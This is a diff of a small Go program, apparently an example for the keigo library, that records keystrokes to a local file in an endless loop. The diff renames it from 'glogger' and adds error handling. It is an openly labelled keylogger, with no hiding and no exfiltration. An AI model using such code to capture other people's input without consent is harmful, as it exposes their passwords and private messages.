@@ -1,17 +1,19 @@
-// Program glogger logs user input and outputs to file.
+// Program keigo logs user input and outputs to file.
 package main
 
-import "log"
-import "os"
-import "time"
+import (
+	"log"
+	"os"
+	"time"
 
-import "github.com/karlek/keigo"
-
-const (
-	fileName = "glogger.out"
+	"github.com/karlek/keigo"
 )
 
-// Error wrapper
+const (
+	fileName = "keigo.out"
+)
+
+// Error wrapper.
 func main() {
 	err := logToFile()
 	if err != nil {
@@ -27,8 +29,13 @@ func logToFile() (err error) {
 	defer file.Close()
 
 	for {
+		err = keigo.KeyLog(file)
+		if err != nil {
+			return err
+		}
+
+		// Prevents 100% CPU usage.
 		time.Sleep(1 * time.Microsecond)
-		keigo.KeyLog(file)
 	}
 
 	return nil
